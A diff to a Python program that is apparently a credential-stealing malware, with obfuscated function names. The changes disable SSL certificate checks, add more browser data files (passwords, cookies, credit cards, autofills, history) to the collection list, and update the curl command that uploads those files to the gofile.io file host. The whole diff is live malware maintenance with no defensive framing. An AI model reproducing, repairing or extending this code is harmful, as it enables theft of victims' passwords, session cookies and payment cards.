@@ -18,6 +18,8 @@ from zipfile import ZipFile, ZIP_DEFLATED
 from sqlite3 import connect as sql_connect
 from urllib.request import Request, urlopen
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
+import ssl
+ssl._create_default_https_context = ssl._create_unverified_context
 
 class NullWriter(object):
     def write(self, arg):
@@ -795,7 +797,10 @@ def G378r0W53r5(br0W53rP47H5):
     if TrU57(C00K13s) == True: __import__('sys').exit(0)
     for thread in Browserthread: thread.join()
 
-    for file in ["cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofills.txt", "cshistories.txt", "csbookmarks.txt"]:
+    for file in [
+        "cspasswords.txt", "cscookies.txt", "cscreditcards.txt", "csautofills.txt",
+        "csautofill.txt", "cshistory.txt", "cshistories.txt", "csbookmarks.txt"
+    ]:
         filess.append(UP104D7060F113(os.getenv("TEMP") + "\\" + file))
     headers = {"Content-Type": "application/json","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
 
@@ -1037,8 +1042,8 @@ def UP104D7060F113(path):
         
         if servers:
             selected_server = servers[0]["name"]
-            upload_url = f'https://{selected_server}.gofile.io/uploadFile'
-            r = subprocess.Popen(f'curl -F "file=@{path}" {upload_url}', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+            upload_url = f'https://{selected_server}.gofile.io/contents/uploadfile'
+            r = subprocess.Popen(f'curl -X POST "{upload_url}" -F "file=@{path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
             
             return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
     except Exception as e:
